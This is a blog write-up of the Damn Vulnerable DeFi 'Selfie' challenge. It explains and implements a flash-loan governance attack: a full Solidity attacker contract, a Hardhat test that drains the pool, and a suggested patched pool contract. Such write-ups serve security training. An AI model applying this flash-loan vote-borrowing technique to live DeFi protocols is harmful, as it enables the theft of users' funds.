---
layout: post
title: Damn Vulnerable DeFi - Selfie
---

## Description
A new cool lending pool has launched! It's now offering flash loans of DVT tokens.

Wow, and it even includes a really fancy governance mechanism to control it.

What could go wrong, right ?

You start with no DVT tokens in balance, and the pool has 1.5 million. Your objective: take them all.

## Solution
This exploit involves two contracts. On the one hand, we have `SelfiePool`. It's a flash loaning contract
with an additional function to drain all funds, and `drainAllFunds` is guarded behind a modifier. The only caller that can drain funds is the governance contract.

On the otherhand we have the governance contract, `SimpleGovernance`. As we shall see, perhaps it's a little too simple! Performing a governance action is a simple process: if we have enough votes then we can queue an
action. After a fixed amount of time the action is executable by anybody.

Let's take out a flash loan so we can accumulate enough votes to queue an action. Once the action is
queued no one can stop us! They just stare in dismay as the clock ticks down to the moment we execute the action and drain the funds...

The steps are
1. Take out a flash loan of the governance token
2. Queue an action to call `drainAllFunds`
3. Twiddle our thumbs while we wait
4. Execute the action

```
contract SelfieAttacker {
    SimpleGovernance private simpleGovernance;
    SelfiePool private selfiePool;
    DamnValuableTokenSnapshot private dvtSnapshot;
    address private attacker;
    uint256 actionId;

    function attackStep1(address _selfiePool, address _simpleGovernance, address _dvtSnapshot) external {
        simpleGovernance = SimpleGovernance(_simpleGovernance);
        selfiePool = SelfiePool(_selfiePool);
        dvtSnapshot = DamnValuableTokenSnapshot(_dvtSnapshot);
        attacker = msg.sender;
        selfiePool.flashLoan(dvtSnapshot.balanceOf(_selfiePool));
    }

    function attackStep2() external {
        simpleGovernance.executeAction(actionId);
    }

    function receiveTokens(address token, uint256 amount) external {
        dvtSnapshot.snapshot();
        actionId = simpleGovernance.queueAction(
            address(selfiePool),
            abi.encodeWithSelector(selfiePool.drainAllFunds.selector, attacker),
            0
        );
        dvtSnapshot.transfer(address(selfiePool), amount);
    }
}
```

We execute `attackStep1` first to take out the flash loan and queue an action to drain all the funds. After some time has elapsed we can execute `attackStep2`.

```
it('Exploit', async function () {
    const SelfieAttackerFactory = await ethers.getContractFactory('SelfieAttacker', deployer);  
    const selfieAttacker = await SelfieAttackerFactory.deploy();
    await selfieAttacker.connect(attacker).attackStep1(
        this.pool.address,
        this.governance.address,
        this.token.address
    );
    await ethers.provider.send("evm_increaseTime", [2 * 24 * 60 * 60]);
    await selfieAttacker.connect(attacker).attackStep2();
});
```

## Patched Contract
There isn't an easy way to patch this contract. On-chain governance is hard! There are many
possibilities, but one option could be to drain the funds to a trusted address. In this case
the attacker would still be able to drain the funds, but not capture them.

Let's pretend that `0x72F0Fc10630af02d1a935fA6BD1B4EE89b46A083` is a [Gnosis Safe](https://gnosis-safe.io/) under the control of trusted signers. We could hardcode this address as the receiver.

```
contract SelfiePoolV2 is ReentrancyGuard {

    using Address for address;

    ERC20Snapshot public token;
    SimpleGovernance public governance;

    event FundsDrained(address indexed receiver, uint256 amount);

    modifier onlyGovernance() {
        require(msg.sender == address(governance), "Only governance can execute this action");
        _;
    }

    constructor(address tokenAddress, address governanceAddress) {
        token = ERC20Snapshot(tokenAddress);
        governance = SimpleGovernance(governanceAddress);
    }

    function flashLoan(uint256 borrowAmount) external nonReentrant {
        uint256 balanceBefore = token.balanceOf(address(this));
        require(balanceBefore >= borrowAmount, "Not enough tokens in pool");
        
        token.transfer(msg.sender, borrowAmount);        
        
        require(msg.sender.isContract(), "Sender must be a deployed contract");
        msg.sender.functionCall(
            abi.encodeWithSignature(
                "receiveTokens(address,uint256)",
                address(token),
                borrowAmount
            )
        );
        
        uint256 balanceAfter = token.balanceOf(address(this));

        require(balanceAfter >= balanceBefore, "Flash loan hasn't been paid back");
    }

    function drainAllFunds(address) external onlyGovernance {
        uint256 amount = token.balanceOf(address(this));
        token.transfer(0x72F0Fc10630af02d1a935fA6BD1B4EE89b46A083, amount);
        
        emit FundsDrained(0x72F0Fc10630af02d1a935fA6BD1B4EE89b46A083, amount);
    }
}
```
